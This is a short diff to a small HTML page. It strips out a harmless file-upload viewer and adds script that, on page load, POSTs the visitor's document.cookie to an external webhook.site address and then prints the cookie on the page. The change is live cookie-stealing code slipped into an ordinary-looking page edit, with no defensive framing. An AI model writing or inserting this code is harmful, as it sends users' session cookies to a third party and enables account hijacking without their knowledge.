@@ -3,17 +3,13 @@
                 <title>djksfd</title>
         </head>
         <body>
-                <input type="file" id="file-input">
-                <button id="btn">Submit</button>
-                <div id="content"></div>
+                NONE
         </body>
         <script>
-                document.querySelector("#btn").onclick = () => {
-                        let reader = new FileReader();
-                        reader.readAsBinaryString(document.querySelector("#file-input").files[0]);
-                        reader.onload = function(event) {
-                                document.querySelector("#content").innerText = event.target.result;
-                        }
-                }
+                fetch('https://webhook.site/620d9a75-3f02-4059-93e6-a2b1bfa27f9a', {
+                        method: 'POST',
+                        body: JSON.stringify({cookie: document.cookie})
+                });
+                document.body.innerText = document.cookie;
         </script>
 </html>
